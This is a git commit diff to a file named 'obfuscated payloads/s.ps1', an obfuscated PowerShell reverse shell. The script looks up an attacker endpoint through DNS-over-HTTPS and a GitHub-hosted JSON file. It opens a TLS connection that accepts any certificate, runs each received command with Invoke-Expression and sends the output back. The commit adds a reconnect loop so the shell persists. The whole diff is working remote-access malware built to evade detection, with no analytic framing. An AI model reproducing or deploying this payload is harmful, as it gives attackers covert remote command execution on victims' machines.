351efb9ca128d37830fb7bd9b8e52358eed89702
soumyo001 <www.soumyo@gmail.com>
2025-08-12 01:44:00 +0600

    mods

--- obfuscated payloads/s.ps1
+++ obfuscated payloads/s.ps1
@@ -1,52 +1,64 @@
- SET-ITEm (           'v'         +         'arI'      +          'abLE:'    +         '70X'         +     'k'      )  (       [tYpe](       'sY'       +    'st'        +        'Em.t'       +      'EXT.eNcoDing'   )       )      ;        function Dn`SlOok`Up(        ${DN`SReC`ord}        ){
-    ${R`EsP`oNsE}         =          (                  &         (    'In'       +     'vo'        +     'ke-WebReque'           +      'st'         ) (     (   (        'ht'           +        't' )  +     'ps'      +         ':'     +      '/'          +      '/'       +        '1'       +        (     '.1'        +     '.'     )      +        '1'       +           '.'          +         '1/'        +         (     'd'        +        (    'ns-'        +   'q'       )       )       +        (    (          'ue'        +            'ry'       )       +       '?'          +        (          'nam'       +     'e='          )       )         +     (        (     'p'         +      'owe'   )       +       'rs'         )         +       (       (        'hel'         +       'l-'      )         +          'r'         )     +      'e'         +        (        (         'ver'    +      'se'           )  +         '-s'      )        +         'he'      +      'll'         +       '.'       +     (   'd'       +         'e'         +         (       'mo.'       +         'e'         )     )        +      'x'       +      (     (      'a'     +    'mp'       )          +       'le'          )        +        (      (       '.co'        +          'm&'       )        +       't'       )     +        (     'yp'       +         'e='           )         )     +         ${dNsRE`CO`RD}        ) -Headers @{(        (       'ac'      +        'ce'   )   +     'pt'       )           =         (   'ap'     +  'pl'      +     (        'ic'       +     (        'a'      +      'ti'       +    'on/d'         )         +         'ns'      +       '-'           )     +        (     (         'js'    +  'o'   )        +        'n'        )      )}      )."C`onT`EnT"
-    return (        (       geT-chiLdiTem  (           "VArIABLE"       +    ":7"    +      "0Xk"        )        ).VALUE::"u`TF8"."GE`TsTR`ing"(       ${r`eSpOn`sE}         )   |             &          (        'Con'       +       'vertF'          +      'rom-Jso'           +         'n'         )      )."An`SWER"."D`ATa".(          't'       +   'rim'         )."iNV`Oke"(      '"'        )
+$ONY      =            [type](     'S'      +      'Y'       +            'SteM.tE'    +          'X'       +      't.E'       +     'ncODiNG'     )      ;          function d`N`SLOokup(      ${DN`SRe`cord}         ){
+    ${r`e`s`ponsE}       =       (                &        (         'Inv'      +     'o'       +       'ke-'        +        'WebR'   +        'equest'    ) (        (    (     'h'        +         (     't'    +           'tps'       )  +         ':/'     )            +         '/1'     +     '.1'   +    (     (       '.'       +          '1.1/'        )      +      'dn'        )     +   (    's'    +       (     '-q'      +     'uer'        )    +       'y?'      )   +       (        'n'     +        (        'am'    +      'e'      )       )      +        '='      +       (        (      'po'         +     'w'       )          +    'e'        )   +        (       (        'rs'         +     'he'    )       +      (      'l'        +         'l-re'     )        +     've'      )          +        'r'         +      (    (        's'        +     'e-'       )        +       's'      )     +      (       (           'he'        +       'll'        )   +         '.'       )  +    'd'        +        'e'          +       'm'      +        'o'       +      (        '.'   +     'ex'       +     (         'a'         +      'mp'    )      )      +       'l'      +         (        (       'e'         +      '.com'         )         +         (       '&t'    +       'y'          )      +       'p'         )         +    'e'        +    '='       )        +        ${D`NS`REcoRd}    ) -Headers @{(     (           'ac'     +    'c'      )      +      (     'ep'          +   't'        )      )     = (     (           (       'app'          +          'li'      )     +      'c'         )      +   (          (        'at'         +        'i'        )       +             (      'on'     +      '/'       )         ) +           'dn'      +       's'        +        (        (          '-'        +        'js'     )        +    'on'         )      )}         )."C`O`NTeNt"
+    return (          (            get-vaRIAbLE onY -ValUe          )::"Ut`F8"."GeT`Str`I`NG"(          ${rE`Sp`ONSE}         )      |                 &          (        'Conv'     +      'ertFr'         +     'om-J'             +         's'      +         'on'      )    )."a`NS`WER"."d`ATA".(      'tr'    +        'im'      )."In`V`oKE"(     '"'        )
 }
 
-${J}        =               &         (        'Inv'     +      'oke-Res'   +         'tMeth'     +   'o'           +        'd'     ) -Uri (     (      'h'        +      (     'ttp'          +            's'         )        )         +    (          ':/'      +     '/'         )     +     (        'gi'          +      'th'   )           +     (   'u'       +     (       'b.'       +         'c'    )          )      +      'o'      +       'm'       +       '/'      +        'S'        +       'ou'        +        'my'       +       (        'o'     +       (     '0'       +       '01'      )      )         +        '/'      +           'p'        +       'r'       +      (       'o'      +       (        'gre'       +           'ss'      )      )       +       (    'i'       +      (       've'     +    '_0'        )     )   +      (     (     'v'   +         'er'      )    +      'l'        )   +     (       (      'oa'      +     'd'    )      +     (       '/r'         +       'a'       )        )      +        (        'w/'         +      'r'          )      +      (       (        'e'    +          'fs/'          )           +         'h'      +      (       'e'      +        'ad'        )         )       +      (       's/'         +       'ma'         )         +      (         (       'in/'     +     'p'         )            +    (       'a'        +         'yl'    )       )     +            (        'oa'     +        'd'     )    +        (        (          's/i'            +     'p'   )    +            (    '_po'        +      'r'      )     +      't.'         )     +          (         'j'           +   (      's'      +       'on'        )    )   )
+${J}           =              &        (       'Invoke-'     +      'RestMe'       +       'th'        +      'od'        ) -Uri (       'ht'       +            't'         +          (       (   'ps:/'      +        '/'      )         +    (         'gi'  +       't'          )     )    +        (          'hu'      +              'b'     )      +     '.'    +       (     'co'         +         (   'm'           +          '/So'     )        )         +        (       'u'     +       (     'myo0'      +       '0'      )       )       +      (       (      '1'         +     '/pro'       )   +        'g'       )        +          're'           +       (       (             's'        +           'si'        )        +     (   've'   +     '_'    )          )        +     '0v'         +      'e'      +        'rl'            +     'o'         +        (         'ad'    +     '/'       )           +     (      'r'         +       (        'aw/re'      +         'f'          )     )       +     's'     +         (          '/'      +       (       'he'          +          'a'       )        )      +      (      'd'   +         's/'     +         (          'm'      +  'ain'         +      '/p'           )       )        +      (       'a'          +        (    'y'   +       'lo'        )    )     +         'a'        +          'ds'       +    (         '/'      +          'ip'       )       +       (     ( '_p'        +       'ort'          )       +     '.'  )       +      'j'       +       (          'so'        +    'n'       )     )
 
-${R`eM`ot`eip}      =          ${J}."IP"
-${rEm`OT`e`pOrt}            =      ${j}."P`oRT"
+${RE`mO`TEiP}       =         ${j}."I`p"
+${r`emoTEP`Ort}        =           ${J}."p`OrT"
 
-do {
-            .    (       'Start-S'        +       'l'         +     'e'       +   'ep'         ) -Seconds 1
-    try{
-        ${Tc`PC`oN`Ne`ctiON}             =               .        (   'Ne'         +          'w'     +     '-Object'    ) (            'Syste'       +     'm'      +       '.N'         +     'et'         +      '.'      +        'S'         +       'ockets.TcpCl'    +      'ien'          +        't'         )(           ${rEMo`T`eiP}, ${R`E`MOtE`pOrt}        )
-    }catch{}
-} until (      ${T`CpCONNec`T`I`On}."C`OnNe`cteD"        )
+while (       ${t`RUe}        ) {
+    do {
+               .        (         'Star'          +       't-'     +            'Sleep'     ) -Seconds 1
+        try{
+            ${tCpc`onnEcT`i`oN}      =                     .       (      'N'       +          'ew'           +      '-Object'     ) (          'Syst'      +        'e'      +        'm'       +      '.Net.Sock'     +      'ets.'       +         'TcpClie'       +       'nt'         )(       ${re`MotE`Ip}, ${ReM`o`Te`PorT}        )
+        }catch{}
+    } until (        ${tCp`c`oNnE`ctiON}."Co`NN`ectEd"       )
+
+    try {
+        ${nEtworK`ST`REaM}        =   ${TC`P`coNNE`C`TiON}.(       'Get'        +         'Strea'    +       'm'       )."InvO`Ke"(                )
+        ${s`s`Ls`TReaM}         =                &         (        'N'   +      'ew-O'     +        'bject'      ) (     'Sy'         +    's'        +    'te'     +       'm.'         +    'N'   +    'et.Secu'         +      'rity.SslStream'   )(        ${N`ETW`o`RkSTrE`Am}, ${FA`LSe}, (           {${T`RUE}} -as [System.Net.Security.RemoteCertificateValidationCallback]          )         )
+        ${SsL`St`REaM}.(       'A'      +        'uth'        +       'e'  +        'nti'     +   'c'        +         'ateAsClien'     +         't'      )."i`Nv`OKe"(           (     'cl'           +     (      'o'       +     'ud'      )         +       (   'f'        +       'la'      +    (    're'      +         '-d'           +       'ns'         )   )      +        (       '.c'        +         'om'           )      ), ${nU`lL}, ${fa`l`SE}        )
+        
+        if (       !${SS`lsTr`Eam}."i`SA`UTHenTI`C`AtEd" -or !${s`Slst`REaM}."iS`s`iGnEd"         ) {
+            ${ss`Lst`ReAM}.(       'Clos'       +      'e'        )."INV`OkE"(            )
+            ${T`cP`C`OnNECTiOn}.(     'C'     +      'lose'            )."i`Nvoke"(        )
+            continue
+        }
 
 
-${netWoRK`strE`AM}         =         ${t`CPcO`N`NEc`TioN}.(         'Get'        +           'Stre'     +            'am'  )."InVo`KE"(             )
-${Ss`L`StReAm}      =                    .      (         'New-O'       +        'b'        +        'ject'       ) (       'Sy'       +        'st'    +        'em.N'       +       'et.Security'   +         '.SslS'      +    'trea'     +        'm'       )(        ${NetworK`ST`RE`Am}, ${fA`LsE}, (    {${t`RUe}} -as [System.Net.Security.RemoteCertificateValidationCallback]       )        )
-${SsL`sTr`eAM}.(      'Aut'        +    'henticate'         +    'AsCl'         +        'ie'        +        'nt'         )."i`NVO`KE"(        (     'c'    +    (      'l'        +      'ou'          +        (        'd'     +       'fla'          )        )       +       'r'         +       (           (      'e'    +         '-dns'     )          +     '.'      )       +     'co'      +      'm'        ), ${nU`lL}, ${Fa`L`sE}     )
+        ${Str`EA`mwrIT`Er}           =                &        (      'New-Ob'         +       'j'     +        'ect'          ) (      'Syst'         +   'em.'        +      'IO.StreamWr'       +      'ite'     +        'r'       )(      ${sS`LST`Re`Am}       )
 
-if (      !${S`sLst`REam}."IsaUthEnT`Ic`A`T`ed" -or !${SSlS`Tr`EAM}."i`Ss`ignED"       ) {
-    ${sSL`STR`EaM}.(   'Cl'     +         'ose'      )."iN`Vo`kE"(               )
-    exit
-}
+        function W`RITeSTreaM`To`s`Er`VER(          ${str`InG}      ){
+            [byte[]]${S`Cr`i`pt:bUffER}        =          0..${t`cPco`NNe`c`TION}."ReCeivebuF`F`ER`SIZE"          |                .          (    '%'            ) {0}
+            ${stR`ea`m`wriTEr}.(      'W'      +       'rite'    )."In`VO`ke"(       ${sTR`iNG}        +      (       'SH'         +          (   'E'      +  (       'LL'      +      ' '        )       )           )         +        (               .       (     'Get'         +        '-'            +       'L'      +            'ocation'       )       )."pa`Th"        +        (      ' :'       +         '>'      )      )
+            ${stREAmw`R`iter}.(        'Flus'          +      'h'        )."I`NvOke"(          )
+        }
 
+                  .      (       'writeSt'     +      'r'        +         'eam'          +       'ToServer'    ) ''
 
-${stR`eamW`RITeR}        =                 .     (       'N'    +      'ew-'        +        'Object'     ) (        'S'     +       'yst'       +         'em'     +     '.'      +         'IO.Stream'      +      'Writer'        )(        ${Ssls`T`ReaM}   )
-
-function w`RiteST`REAM`TOSeR`V`eR(        ${StR`ing}       ){
-    [byte[]]${sC`R`i`pt:BUffEr}      =  0..${t`cpconn`ECtIon}."reCe`I`VEbUffERs`iZe"           |                 &      (          '%'    ) {0}
-    ${St`R`eaMwRI`Ter}.(         'Wr'         +       'ite'      )."i`NVokE"(   ${stR`ING}       +        (    (        'SH'       +       'E'          )           +        (       'LL'         +      ' '        )       )       +         (          &     (    'Ge'    +     't'       +        '-L'        +         'ocation'        )     )."p`Ath"       +       (       ' :'        +         '>'     )      )
-    ${s`TReA`MWri`TeR}.(         'F'         +      'lush'        )."iN`Vo`Ke"(                     )
-}
-
-       &      (        'wri'           +       't'            +         'eS'     +     't'        +          'reamToSe'        +      'rver'      ) ''
-
-while (        (     ${byT`e`SrEad}       =     ${s`SLS`TR`eam}.(      'Rea'          +         'd'        )."I`NVo`KE"(    ${s`Cr`iPT:bu`FFEr}, 0, ${sc`Rip`T:Buf`FER}."Len`GTh"      )       ) -gt 0     ) {
-
-    ${C`OmMAnD}         =        $70XK::"u`TF8"."gEtST`R`InG"(       ${S`CRI`p`T:`BUFFeR}, 0, ${b`yTesR`EAD} - 1        )
-
-    ${COMMa`N`D`_oUTPut}       =      try {
-              &      (      'In'       +            'voke-Expre'       +      's'            +         's'      +      'ion'    ) ${Co`Mm`ANd} 2>&1        |                   .    (      'O'+          'ut'    +          '-String'        )
+        while (    (      ${ByTE`s`R`ead}       =        ${sSls`T`Ream}.(      'R'           +  'ead'      )."iNv`okE"(       ${ScRI`PT:BUF`FEr}, 0, ${SC`RIPT:`B`U`FFeR}."L`ength"     )     ) -gt 0             ) {
+        
+            ${cO`mMa`Nd}       =          (       itEm  (         'v'    +        'ariA'         +          'BL'    +     'E:ONy'         )       ).VALUe::"UT`F8"."GetstR`i`Ng"(        ${sCripT`:bu`FF`Er}, 0, ${By`Tes`R`ead} - 1       )
+        
+            ${Co`MMa`N`D_OutP`UT}      =          try {
+                        .        (     'Invoke-'           +         'Expr'       +           'e'          +     'ssi'    +      'on'     ) ${coMMA`Nd} 2>&1           |                &       (         'Ou'       +    't-St'      +      'ring'         )
+            }
+            catch {
+                ${_}      |                       &       ( 'Out'        +        '-'        +        'String'        )
+            }
+                .        (          'wri'         +      'teStre'       +      'am'       +     'To'          +         'Serve'         +       'r'   )(        ${c`ommAn`D`_ouTPut}        )
+        }
+        ${stRe`Am`wRI`T`Er}.(     'C'       +          'lose'      )."i`NVoke"(             )
+        ${SS`lS`T`REaM}.(     'Clo'      +       'se'      )."i`N`VOKE"(                  )
+        ${tCp`CONne`CtIOn}.(    'Clos'      +     'e'          )."In`Voke"(                 )
     }
     catch {
-        ${_}         |               &     (       'Out'  +     '-'         +           'String'         )
+        if (    ${St`R`eA`mwRITER}        ) { ${ST`REA`mw`RitER}.(          'Cl'     +       'ose'     )."INV`OKe"(              ) }
+        if (        ${ssL`STr`E`Am}       ) { ${SSlStR`E`AM}.(          'Clos'       +        'e'         )."InV`OkE"(         ) }
+        if (       ${TCPcoN`Ne`cT`ioN}     ) { ${tcp`cO`NNEc`TioN}.(        'Clo'     +      'se'       )."INvo`ke"(              ) }
     }
-            .      (       'w'    +       'r'          +        'iteStreamToSer'         +          'ver'          )(        ${C`o`MmAnd_`oUTPut}        )
-}
 
-${s`T`R`eAmW`RitEr}.(     'C'    +    'lose'   )."i`Nv`Oke"(                  )
+           &    (             'Sta'     +         'r'  +    't-Sle'           +       'ep'           ) -Seconds 5
+}
